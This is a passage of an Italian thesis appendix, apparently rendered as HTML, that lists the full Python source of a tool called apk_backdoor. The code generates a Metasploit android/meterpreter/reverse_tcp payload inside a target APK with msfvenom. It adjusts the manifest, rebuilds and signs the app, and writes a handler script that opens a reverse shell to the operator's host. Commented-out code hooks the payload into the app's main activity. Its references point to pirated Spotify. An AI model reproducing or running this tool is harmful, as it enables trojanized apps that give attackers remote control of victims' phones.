    <span class="n">payload</span> <span class="o">=</span> <span class="n">Payload</span><span class="p">(</span><span class="n">apk</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">public_host</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s">'[ ==== PAYLOAD INJECTION ==== ]'</span><span class="o">.</span><span class="n">center</span><span class="p">(</span><span class="mi">120</span><span class="p">))</span>
    <span class="n">payload</span><span class="o">.</span><span class="n">inject</span><span class="p">()</span>
    <span class="n">payload</span><span class="o">.</span><span class="n">delete</span><span class="p">()</span>

    <span class="k">while</span> <span class="n">args</span><span class="o">.</span><span class="n">write_meterpreter_configuration</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">do_write</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.YELLOW}Would you like to save a meterpreter configuration file? [Y/n] '</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">do_write</span> <span class="o">==</span> <span class="s">''</span> <span class="ow">or</span> <span class="n">do_write</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s">'y'</span><span class="p">:</span>
            <span class="n">ans</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">elif</span> <span class="n">do_write</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s">'n'</span><span class="p">:</span>
            <span class="n">ans</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">ans</span> <span class="o">=</span> <span class="bp">None</span>
            <span class="k">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="s">"Please, input either 'y' or 'n' (case insensitive)"</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
        <span class="n">args</span><span class="o">.</span><span class="n">write_meterpreter_configuration</span> <span class="o">=</span> <span class="n">ans</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">write_meterpreter_configuration</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'meterpreter.rc'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'use exploit/multi/handler</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'set PAYLOAD android/meterpreter/reverse_tcp</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="s">'set LHOST {args.host.ip}</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="s">'set LPORT {args.host.port}</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'exploit -j -z</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Configuration written to 'meterpreter.rc'"</span><span class="p">)</span>

    <span class="k">print</span><span class="p">()</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="appendix-red-team-tool-payload">A.2.5. File: payload.py</h4>
<div class="paragraph">
<p>Questo file gestisce il payload e la sua creazione e iniezione nell&#8217;APK
originale.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">glob</span>
<span class="kn">import</span> <span class="nn">logging</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">xml.etree.ElementTree</span> <span class="k">as</span> <span class="n">ET</span>

<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">utilities</span>
<span class="kn">from</span> <span class="nn">.apk</span> <span class="kn">import</span> <span class="n">Apk</span>
<span class="kn">from</span> <span class="nn">.utilities</span> <span class="kn">import</span> <span class="n">phase</span>


<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_apk</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">public_host</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span> <span class="o">=</span> <span class="n">target_apk</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">public_host</span> <span class="o">=</span> <span class="n">public_host</span> <span class="k">if</span> <span class="n">public_host</span> <span class="k">else</span> <span class="n">host</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__generate_payload</span><span class="p">()</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Generating the payload'</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__generate_payload</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">payload_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s">'payload.apk'</span><span class="p">)</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">"msfvenom -x {self.target_apk.full_path} -p android/meterpreter/reverse_tcp LHOST={self.public_host.ip} LPORT={self.public_host.port} -o {payload_path}"</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Generating payload...'</span><span class="p">)</span>
        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done'</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span> <span class="o">=</span> <span class="n">Apk</span><span class="p">(</span><span class="n">payload_path</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__decompile</span><span class="p">()</span>
        <span class="c1"># self.__decompile_target()
</span>        <span class="c1"># self.__inject_payload_files()
</span>        <span class="c1"># self.__get_target_main_activity()
</span>        <span class="c1"># self.__inject_payload_hook()
</span>        <span class="bp">self</span><span class="o">.</span><span class="n">__inject_permissions</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">build</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">sign</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__remove_decompiled</span><span class="p">()</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Decompiling the target APK'</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__decompile_target</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span><span class="o">.</span><span class="n">decompile</span><span class="p">()</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Decompiling the payload's APK"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__decompile</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompile</span><span class="p">()</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Injecting payload's file in target APK"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__inject_payload_files</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">metasploit_package</span> <span class="o">=</span> <span class="s">'com/metasploit/stage'</span>
        <span class="n">files_to_copy</span> <span class="o">=</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'smali/'</span><span class="p">,</span> <span class="n">metasploit_package</span><span class="p">,</span> <span class="s">'*Payload*.smali'</span>
        <span class="p">))</span>
        <span class="n">copy_dest</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'smali/'</span><span class="p">,</span> <span class="n">metasploit_package</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">copy_dest</span><span class="p">):</span>
            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Creating folder: '{copy_dest}'"</span><span class="p">)</span>
            <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">copy_dest</span><span class="p">)</span>
        <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files_to_copy</span><span class="p">:</span>
            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Copying file '{file}' to '{copy_dest}'"</span><span class="p">)</span>
            <span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="n">copy_dest</span><span class="p">)</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Injecting missing permissions'</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__inject_permissions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="s">"""
        :type apk: Apk
        """</span>
        <span class="n">ANDROID_NAME</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}name'</span>
        <span class="n">MIN_SDK</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}minSdkVersion'</span>
        <span class="n">TARGET_SDK</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}targetSdkVersion'</span>
        <span class="n">MAX_SDK</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}maxSdkVersion'</span>

        <span class="n">target_tree</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'AndroidManifest.xml'</span><span class="p">))</span>
        <span class="c1"># target_permissions = [perm.get(ANDROID_NAME) for perm in target_tree.getroot().findall('uses-permission')]
</span>        <span class="c1"># target_features = [feat.get(ANDROID_NAME) for feat in target_tree.getroot().findall('uses-feature')]
</span>
        <span class="c1"># payload_tree = ET.parse(os.path.join(self.__payload_apk.decompiled_path, 'AndroidManifest.xml'))
</span>        <span class="c1"># payload_permissions = [perm.get(ANDROID_NAME) for perm in payload_tree.getroot().findall('uses-permission')
</span>        <span class="c1">#                        if perm.get(ANDROID_NAME) not in target_permissions]
</span>        <span class="c1"># payload_features = [feat.get(ANDROID_NAME) for feat in payload_tree.getroot().findall('uses-feature')
</span>        <span class="c1">#                     if feat.get(ANDROID_NAME) not in target_features]
</span>
        <span class="c1"># for perm in payload_permissions:
</span>        <span class="c1">#     logging.debug(f"Adding permission: '{perm}'")
</span>        <span class="c1">#     permission = ET.SubElement(target_tree.getroot(), 'uses-pemission')
</span>        <span class="c1">#     permission.set(ANDROID_NAME, perm)
</span>        <span class="c1"># for feat in payload_features:
</span>        <span class="c1">#     logging.debug(f"Adding feature: '{feat}'")
</span>        <span class="c1">#     feature = ET.SubElement(target_tree.getroot(), 'uses-feature')
</span>        <span class="c1">#     feature.set(ANDROID_NAME, feat)
</span>
        <span class="n">sdk</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">SubElement</span><span class="p">(</span><span class="n">target_tree</span><span class="o">.</span><span class="n">getroot</span><span class="p">(),</span><span class="s">'uses-sdk'</span><span class="p">)</span>
        <span class="n">sdk</span><span class="o">.</span><span class="nb">set</span><span class="p">(</span><span class="n">MIN_SDK</span><span class="p">,</span> <span class="s">"22"</span><span class="p">),</span>
        <span class="n">sdk</span><span class="o">.</span><span class="nb">set</span><span class="p">(</span><span class="n">TARGET_SDK</span><span class="p">,</span> <span class="s">"22"</span><span class="p">)</span>
        <span class="n">sdk</span><span class="o">.</span><span class="nb">set</span><span class="p">(</span><span class="n">MAX_SDK</span><span class="p">,</span> <span class="s">"29"</span><span class="p">)</span>

        <span class="n">target_tree</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'AndroidManifest.xml'</span><span class="p">),</span> <span class="n">xml_declaration</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
                          <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Detecting target's MainActivity"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__get_target_main_activity</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">main_activity</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_main_activity_file</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span><span class="o">.</span><span class="n">get_main_activity</span><span class="p">()</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"The main activity is: '{main_activity}'"</span><span class="p">)</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Injecting payload's hook"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__inject_payload_hook</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_main_activity_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'Reading from Main Activity file'</span><span class="p">)</span>
            <span class="n">main_activity_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">to_find</span> <span class="o">=</span> <span class="s">';-&gt;onCreate(Landroid/os/Bundle;)V'</span>
        <span class="n">to_add</span> <span class="o">=</span> <span class="s">'invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V'</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'Inserting the payload invocation in the Main Activity'</span><span class="p">)</span>
        <span class="n">main_activity_content_lines</span> <span class="o">=</span> <span class="n">main_activity_content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="n">main_activity_content_lines</span><span class="p">[:]</span> <span class="o">=</span> <span class="p">[</span><span class="n">l</span> <span class="k">if</span> <span class="n">to_find</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">l</span> <span class="k">else</span> <span class="n">l</span><span class="o">+</span><span class="s">'    '</span> <span class="o">+</span> <span class="n">to_add</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span>
                                          <span class="n">main_activity_content_lines</span><span class="p">]</span>
        <span class="c1">#
</span>        <span class="c1"># main_activity_content = main_activity_content.replace(to_find, to_find + '\n    ' + to_add)
</span>        <span class="n">main_activity_content</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">main_activity_content_lines</span><span class="p">)</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_main_activity_file</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'Writing the Main Activity file'</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">main_activity_content</span><span class="p">)</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Removing decompiled payload'</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">__remove_decompiled</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">remove_decompiled</span><span class="p">()</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Deleting payload's APK"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">full_path</span><span class="p">)</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="appendix-red-team-tool-utilities">A.2.6. File: utilities.py</h4>
<div class="paragraph">
<p>Questo file contiene delle funzioni e dei decoratori utili al resto del tool.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">logging</span>
<span class="kn">import</span> <span class="nn">platform</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>


<span class="k">def</span> <span class="nf">phase</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">phase_decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
        <span class="k">def</span> <span class="nf">function_wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">' [+] {msg}...'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
            <span class="k">except</span> <span class="nb">BaseException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.RED}ERROR{Style.RESET_ALL}'</span><span class="p">)</span>
                <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="n">f</span><span class="s">"{type(e).__name__} --- {str(e)}"</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">"{Fore.RED}{type(e).__name__} - {str(e)}</span><span class="se">\n</span><span class="s">"</span>
                      <span class="s">"    To get more information about the error, take a look at the log file (apk_backdoor.log).</span><span class="se">\n</span><span class="s">"</span>
                      <span class="s">"    You can increase the verbosity level of the log file using the --verbose option"</span><span class="p">)</span>
                <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.GREEN}Done{Style.RESET_ALL}'</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">function_wrapper</span>

    <span class="k">return</span> <span class="n">phase_decorator</span>


<span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">f</span><span class="s">"Executing command: '{command}'"</span><span class="p">)</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">split</span><span class="p">(</span>
        <span class="s">' '</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">output</span> <span class="o">==</span> <span class="n">b</span><span class="s">''</span> <span class="ow">and</span> <span class="n">process</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
            <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">rc</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">rc</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">message</span> <span class="o">=</span> <span class="n">f</span><span class="s">"The command '{command}' exited with non-zero code"</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="k">raise</span> <span class="nb">RuntimeError</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">rc</span>


<span class="k">def</span> <span class="nf">get_title</span><span class="p">(</span><span class="n">center</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">title</span> <span class="o">=</span> <span class="s">'''
 ▄▄▄       ██▓███   ██ ▄█▀    ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄  ▒█████   ▒█████   ██▀███
▒████▄    ▓██░  ██▒ ██▄█▒    ▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
▒██  ▀█▄  ▓██░ ██▓▒▓███▄░    ▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
░██▄▄▄▄██ ▒██▄█▓▒ ▒▓██ █▄    ▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄
 ▓█   ▓██▒▒██▒ ░  ░▒██▒ █▄   ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
 ▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▒ ▓▒   ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
  ▒   ▒▒ ░░▒ ░     ░ ░▒ ▒░   ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
  ░   ▒   ░░       ░ ░░ ░     ░    ░   ░   ▒   ░        ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░
      ░  ░         ░  ░       ░            ░  ░░ ░      ░  ░      ░        ░ ░      ░ ░     ░
                                   ░           ░                ░

A tool developed by Andrea Esposito
    '''</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">center</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">title</span>

    <span class="k">return</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">l</span><span class="o">.</span><span class="n">center</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">title</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()])</span>


<span class="k">def</span> <span class="nf">clear_screen</span><span class="p">():</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s">"cls"</span> <span class="k">if</span> <span class="n">platform</span><span class="o">.</span><span class="n">system</span><span class="p">()</span> <span class="o">==</span> <span class="s">"Windows"</span> <span class="k">else</span> <span class="s">"clear"</span><span class="p">,</span>
                    <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">resize_screen</span><span class="p">(</span><span class="n">rows</span><span class="o">=</span><span class="mi">40</span><span class="p">,</span> <span class="n">cols</span><span class="o">=</span><span class="mi">120</span><span class="p">):</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span>
        <span class="n">f</span><span class="s">'mode con: cols={cols} lines={rows}'</span> <span class="k">if</span> <span class="n">platform</span><span class="o">.</span><span class="n">system</span><span class="p">()</span> <span class="o">==</span> <span class="s">"Windows"</span> <span class="k">else</span> <span class="n">f</span><span class="s">'resize -s {rows} {cols} &gt; /dev/null'</span><span class="p">,</span>
        <span class="n">shell</span><span class="o">=</span><span class="bp">True</span>
    <span class="p">)</span></code></pre>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_riferimenti">Riferimenti</h2>
<div class="sectionbody">
<div class="ulist bibliography">
<ul class="bibliography">
<li>
<p><a id="spotify-users"></a>[spotify-users] Matthew De Silva, <em>28 ottobre 2019</em>, su &#8220;Quarz&#8221;.
URL: <a href="https://qz.com/1736762/spotify-grows-monthly-active-users-and-turns-profit-shares-jump-15-percent/" class="bare">https://qz.com/1736762/spotify-grows-monthly-active-users-and-turns-profit-shares-jump-15-percent/</a> (visitato il 20 febbraio 2020)</p>
</li>
<li>
<p><a id="spotify-pirated"></a>[spotify-pirated] Rolling Stone, <em>4 agosto 2019</em>, su &#8220;RollingStone&#8221;.
URL: <a href="https://www.rollingstone.it/musica/news-musica/spotify-raggiunge-quota-232-milioni-di-utenti-ma-solo-la-meta-paga/471803/" class="bare">https://www.rollingstone.it/musica/news-musica/spotify-raggiunge-quota-232-milioni-di-utenti-ma-solo-la-meta-paga/471803/</a> (visitato il 23 febbraio 2020)</p>
</li>
</ul>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Versione 1.0.0<br>
Ultimo aggiornamento 2020-02-24 18:00:34 +0100
</div>
</div>
<style>
pre.rouge table td { padding: 5px; }
pre.rouge table pre { margin: 0; }
pre.rouge .cm {
  color: #999988;
  font-style: italic;
}
pre.rouge .cp {
  color: #999999;
  font-weight: bold;
}
pre.rouge .c1 {
  color: #999988;
  font-style: italic;
}
pre.rouge .cs {
  color: #999999;
  font-weight: bold;
  font-style: italic;
}
pre.rouge .c, pre.rouge .ch, pre.rouge .cd, pre.rouge .cpf {
  color: #999988;
  font-style: italic;
}
pre.rouge .err {
  color: #a61717;
  background-color: #e3d2d2;
}
pre.rouge .gd {
  color: #000000;
  background-color: #ffdddd;
}
pre.rouge .ge {
  color: #000000;
  font-style: italic;
}
pre.rouge .gr {
  color: #aa0000;
}
pre.rouge .gh {
  color: #999999;
}
pre.rouge .gi {
  color: #000000;
  background-color: #ddffdd;
}
pre.rouge .go {
  color: #888888;
}
pre.rouge .gp {
  color: #555555;
}
pre.rouge .gs {
  font-weight: bold;
}
pre.rouge .gu {
  color: #aaaaaa;
}
pre.rouge .gt {
  color: #aa0000;
}
pre.rouge .kc {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kd {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kn {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kp {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kr {
